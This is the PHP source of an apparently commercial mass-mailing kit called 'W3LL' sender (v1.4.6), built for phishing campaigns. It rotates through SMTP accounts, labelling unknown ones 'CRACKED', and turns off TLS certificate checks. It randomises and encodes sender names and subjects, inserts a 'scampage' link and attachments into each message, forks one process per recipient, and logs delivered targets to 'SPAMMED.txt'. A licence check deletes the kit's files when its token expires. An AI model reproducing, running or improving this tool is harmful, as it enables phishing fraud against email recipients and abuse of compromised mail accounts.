<?php
system('clear');
date_default_timezone_set('America/Los_Angeles');
require 'setting/phpmailer/PHPMailerAutoload.php';
echo "                      \e[92m  ___       ____________________ \e[0m\r\n";
echo "                      \e[33m  __ |     / /_|__  /__  /___  / \e[0m\r\n";
echo "                        \e[36m__ | /| / /___/_ <__  / __  /  \e[0m\r\n";
echo "                       \e[35m __ |/ |/ / ____/ /_  /___  /___\e[0m\r\n";
echo "                       \e[31m ____/|__/  /____/ /_____/_____/\e[0m\r\n";
echo "                       \e[32;1m                        ✉ V1.4.6\e[0m\r\n";
echo "\r\n";

if (preg_match('/\bDays Left\b/',$checkval)) {
    echo "                         \e[32;1mActive Days : $checkval\n\n\e[0m";
} else if ($checkval == 'Please renew your Token') {
    unlink('README.txt');
    unlink('W3LL.php');
    unlink('setting/phpmailer/class.phpmailer.php');
    unlink('setting/phpmailer/class.smtp.php');
    unlink('setting/phpmailer/PHPMailerAutoload.php');
    unlink('file/W3LL_MAILIST/W3LL_LIST.txt');
    unlink('file/W3LL_LETTER/AOL.html');
    unlink('file/W3LL_LETTER/CHINESE.html');
    unlink('file/W3LL_LETTER/MAIL.RU.html');
    unlink('file/W3LL_LETTER/OFFICE.html');
    unlink('file/W3LL_LETTER/WEBMAIL.html');
    unlink('file/W3LL_LETTER/YAHOO.html');
    rmdir('setting/phpmailer');
    rmdir('setting');
    rmdir('file/W3LL_MAILIST');
    rmdir('file/W3LL_LETTER');
    rmdir('file');
    system('clear');
    echo "                          \e[1;37;41mError : Token Expired\n\e[0m";
    die();
} else {
    echo "                      \e[1;37;41mError : $checkval\n\e[0m";
    die();
}

function encode($text)
{
   $list    = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",":","/") ;
   $replace = array("a", "b", "c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",":","/");
   $walah   = str_replace($list, $replace, $text);
   return $walah;
}

function SmtpType($smtp)
{
    if (preg_match('/\bsendgrid\b/',$smtp)) {
        $type = 'SENDGRID';
    } else if (preg_match('/\bgmail\b/',$smtp)) {
        $type = 'G-SUITE';
    } else if (preg_match('/\bsecuresmtp\b/',$smtp)) {
        $type = 'T-ONLINE';
    } else if (preg_match('/\boffice365\b/',$smtp)) {
        $type = 'OFFICE 365';
    } else if (preg_match('/\bemailsrvr\b/',$smtp)) {
        $type = 'RACKSPACE';
    } else {
        $type = 'CRACKED';
    }
    return $type;
}

function Kirim($email, $smtp_acc, $W3LL_setup)
{
    global $ahh, $num;

    $smtp              = new SMTP;
    $smtp->do_debug    = 0;
    $smtp->SMTPOptions = array('ssl'=>array(
                               'verify_peer'=>false,
                               'verify_peer_name'=>false,
                               'allow_self_signed'=>true));
    $smtpserver        = $smtp_acc['host'];
    $smtpport          = $smtp_acc['port'];
    $smtpuser          = $smtp_acc['username'];
    $smtppass          = $smtp_acc['password'];
    $priority          = $W3LL_setup['priority'];
    $sleeptime         = $W3LL_setup['sleeptime'];
    $replacement       = $W3LL_setup['replacement'];
    $userremoveline    = $W3LL_setup['userremoveline'];
    $fromname          = $W3LL_setup['fromname'];
    $frommail          = $W3LL_setup['frommail'];
    $subject           = $W3LL_setup['subject'];
    $msgfile           = $W3LL_setup['msgfile'];
    $filepdf           = $W3LL_setup['filesend'];
    $randurl           = $W3LL_setup['scampage'];
    $redirect          = $W3LL_setup['redirect'];
    $subject_encrypt   = $W3LL_setup['subject_encrypt'];
    $fromname_encrypt  = $W3LL_setup['fromname_encrypt'];

    if (!$smtp->connect($smtpserver, $smtpport)) {
        //throw new Exception('Connect failed');
        echo " [ \e[0;31mPLEASE CHECK YOUR SMTP SERVER & PORT ! CHECK UR SMTP ON http://smtper.net AND MAKE SURE UR SMTP USE PORT 587 [ CASE 1 ]\e[0m ]\r\n";
        die();
    }

    if (!$smtp->hello(gethostname())) {
        //throw new Exception('EHLO failed: ' . $smtp->getError()['error']);
        echo " [ \e[0;31mPLEASE CHECK YOUR SMTP SERVER & PORT ! CHECK UR SMTP ON http://smtper.net AND MAKE SURE UR SMTP USE PORT 587 [ CASE 2 ] \e[0m ]\r\n";
        die();
    }

    $e         = $smtp->getServerExtList();
    $smtptypez = SmtpType($smtpserver);

    if (array_key_exists('AUTH', $e)) {
        if ($smtp->authenticate($smtpuser, $smtppass)) {
            if (!is_file($msgfile)) {
                echo " [ \e[0;31m LETTER NOT FOUND - PLEASE CHECK YOUR LETTER NAME !\e[0m ]\r\n";
                die();
            }

            if ($W3LL_setup['filesend'] == 1) {
                if (!is_file($W3LL_setup['attach'])) {
                    echo " [ \e[0;31m ATTACHMENT NOT FOUND - PLEASE CHECK YOUR ATTACHMENT NAME !\e[0m ]\r\n";
                    die();
                }
            }

            $randstr023     = RandString1(16);
            $mail           = new PHPMailer;
            $selector       = 'phpmailer';
            $privatekeyfile = 'setting/dkim_private.pem';
            $publickeyfile  = 'setting/dkim_public.pem';
            $mail->Encoding = 'base64'; // 8bit base64 multipart/alternative quoted-printable
            $mail->CharSet  = 'UTF-8';
            $mail->headerLine("format", "flowed");
            $mail->addCustomHeader("MIME-Version: 1.0\r\n");

            //Start SMTP
            $mail->IsSMTP();
            $mail->SMTPAuth    = true;
            $mail->SMTPAutoTLS = 1;
            $mail->Host        = $smtpserver;
            $mail->Port        = $smtpport;
            $mail->Priority    = $priority;
            $mail->Username    = $smtpuser;
            $mail->Password    = $smtppass;
            $mail->SMTPOptions = array ('ssl'=>array(
                                        'verify_peer' =>false,
                                        'verify_peer_name' =>false,
                                        'allow_self_signed'=>true));
            $randstr01         = RandString1(8);
            $randstr011        = RandString(5);
            $randstr012        = RandString1(5);
            $nmbr              = RandNumber(5);

            shuffle($subject);

            $subject  = array_shift($subject);

            shuffle($fromname);

            $fromname  = array_shift($fromname);
            $fromnames = str_replace('++w3ll_smtp++', $smtpuser, $fromname);
            $frommails = str_replace('++w3ll_smtp++', $smtpuser, $frommail);
            $fromnames = str_replace('++w3ll_randstring++', $randstr011, $fromnames);
            $frommails = str_replace('++w3ll_randstring++', $randstr01, $frommails);
            $fromnames = privateLHZ($email, $fromnames, $smtpuser);
            $frommails = privateLHZ1($email, $frommails);
            $subjects  = str_replace('++w3ll_randstring++', $randstr012, $subject);
            $subjects  = subjecting($subjects, $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect);

            if ($fromname_encrypt == 1) {
                $rand = 0;

                switch ($rand) {
                    case 0:
                        $fromnames = '=?UTF-8?B?'.base64_encode($fromnames).'?=';
                        $mail->setFrom($frommails, $fromnames);
                        break;
                }
            } else {
               $mail->setFrom($frommails, $fromnames);
            }

            $mail->AddAddress($email);

            if ($subject_encrypt == 1) {
                $rand = 0;

                switch ($rand) {
                    case 0:
                        $subjects = '=?UTF-8?B?'.base64_encode($subjects).'?=';
                        $mail->Subject = $subjects;
                        break;
                }
            } else {
                $mail->Subject = $subjects;
            }

            if ($W3LL_setup['filesend'] == 1) {
                $attch  = file_get_contents($W3LL_setup['attach']);
                $attach = lettering($W3LL_setup['attach'], $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect);
                file_put_contents($W3LL_setup['attach'], $attach);
                $mail->AddAttachment($W3LL_setup['attach']);
            }

            if ($replacement == 1) {
                $msg = lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect);
            } else {
                $msg = file_get_contents($msgfile);
            }

            $mail->msgHTML($msg);

            if (!$mail->send()) {
                $halo = $mail->ErrorInfo;

                if (preg_match('/\bquota\b/',$halo)) {
                    $err = 1;
                }

                if ($err == 1) {
                    echo "[\e[0;32m".date('d/m/Y h:i:s A')."\033[0m] ";
                    echo "[\e[1;35m";
                    echo $num+1 ."\e[0m] ";
                    echo "\e[0m[\e[1;34m$email\e[0m] ";
                    echo "\e[0m\e==> [\e[0;33m$smtptypez SMTP \e[0m(\e[0;33m$smtpuser\e[0m)] > [\e[0;31m✘- $smtptypez SMTP SEND QUOTA HAS LIMIT - NOT REMOVED\e[0m]\n";
                } else {
                    if ($W3LL_setup['userremoveline'] == 1) {
                        echo "[\e[0;32m".date('d/m/Y h:i:s A')."\033[0m] ";
                        echo "[\e[1;35m";
                        echo $num+1 ."\e[0m] ";
                        echo "\e[0m[\e[1;34m$email\e[0m] ";
                        echo "\e[0m\e==> [\e[0;33m$smtptypez SMTP \e[0m(\e[0;33m$smtpuser\e[0m)] > [\e[0;31mEMAIL NOT VALID - REMOVED\e[0m]\r\n";

                        Savedata($W3LL_setup['mail_list'], trim(str_replace($email, "", file_get_contents($W3LL_setup['mail_list']))));
                        $file = fopen("INVALID.txt", "a+");
                        fwrite($file, "$email\n");
                        fclose($file);
                    } else {
                        echo "[\e[0;32m".date('d/m/Y h:i:s A')."\033[0m] ";
                        echo "[\e[1;35m";
                        echo $num+1 ."\e[0m] ";
                        echo "\e[0m[\e[1;34m$email\e[0m] ";
                        echo "\e[0m\e==> [\e[0;33m$smtptypez SMTP \e[0m(\e[0;33m$smtpuser\e[0m)] > [\e[0;31m✘- EMAIL NOT VALID - NOT REMOVED\e[0m]\n";
                    }
                    //exit();
                }
            } else {
                echo "[\e[0;32m".date('d/m/Y h:i:s A')."\033[0m] ";
                echo "[\e[1;35m";
                echo $num+1 ."\e[0m] ";
                echo "\e[0m[\e[1;34m$email\e[0m] ";
                echo "\e[0m==> [\e[0;33m$smtptypez SMTP \e[0m(\e[0;33m$smtpuser\e[0m)] > [\e[0;32m✔\e[0m]\n";
                $file = fopen("SPAMMED.txt", "a");
                fwrite($file,"". $email." \r\n");
                fclose($file);
            }

            $mail->clearAddresses();
        } else {
            echo "[\e[0;32m".date('d/m/Y h:i:s A')."\033[0m] ";
            echo "[\e[1;35m";
            echo $num+1 ."\e[0m] ";;
            echo "\e[0m[\e[1;34m$email\e[0m] ";
            echo "\e[0m\e==> [\e[0;33m$smtptypez SMTP \e[0m(\e[0;33m$smtpuser\e[0m)] > [\e[0;31m✘- SOMETHING WRONG ON SMTP - NOT REMOVED\e[0m]\n";
            $file = fopen("FAILED.txt", "a");
            fwrite($file,"". $email." \r\n");
            fclose($file);
        }
    }

    $smtp->quit(true);
}

$dipake = 0;

if (!is_file($W3LL_setup['mail_list'])) {
     echo " [ \e[0;31m MAILIST NOT FOUND - PLEASE CHECK YOUR MAILIST NAME !\e[0m ]\r\n";
     die();
}

$file = file_get_contents($W3LL_setup['mail_list']);

if ($file) {
    $ext = explode("\n", $file);
    echo"\e[31m            NOTE: IF YOU DONT BUY THIS SENDER FROM HTTPS://W3LLSTORE.CO, \r\n         MEAN YOU USE ILLEGAL SENDER..AND YOUR TOKEN WILL BE BANNED SOON!\e[0m";
    echo " \r\n\r\n                             \e[1;94m   ############\e[0m                           \r\n";
    echo "\e[0m✨#############################\e[1;32m \e[92mW\e[33m3\e[36mL\e[35mL \e[31mS\e[92mT\e[33mA\e[36mR\e[35mT \e[0m#############################✨\e[0m\n";
    echo "                               \e[1;94m ############\e[0m\r\n";
    echo "\r\n";

    $smtp_key = 0;
    $rat      = $W3LL_setup['ratio'];
    $crot     = 0;
    $crotmax  = count($ext) - 1;

    foreach ($ext as $num=>$email) {
        if ($smtp_key == count($smtp_acc)) {
            $smtp_key = 0;
        }

        $ahh = $ext[$crot];
        $gx_setup['fromname'] = $ahh;
        $crot++;

        if ($crot >= $crotmax){
            $crot = 0;
        }

        $pid = pcntl_fork(); // kirim

        if ($pid == -1) {
            exit("Error forking...\n");
        } else if ($pid == 0) {
            Kirim($email, $smtp_acc[$smtp_key], $W3LL_setup);
            exit();
        }

        $dipake++;
        $smtp_key++;
        $rat--;

        if ($rat == 0)
        {
            sleep($W3LL_setup['sleeptime']);
            $rat = $W3LL_setup['ratio'];
            echo "\e[31m =======SEND $rat EMAIL WITH DELAY ".$W3LL_setup['sleeptime']." SECOND=======\e[0m\r\n";
        }

        if ($W3LL_setup['userremoveline'] == 1) {
            unset($ext[$num]);
            Savedata($W3LL_setup['mail_list'], implode("\n", $ext));

        }
    }

    echo "\n                              \e[1;94m  ###########\e[0m                           \r\n";
    echo "\e[0m ✨#############################\e[1;32m \e[92mW\e[33m3\e[36mL\e[35mL \e[31mD\e[92mO\e[33mN\e[36mE \e[0m#############################✨\e[0m\n";
    echo "                               \e[1;94m ###########\e[0m\r\n";
    echo "\r\n";
}
?>
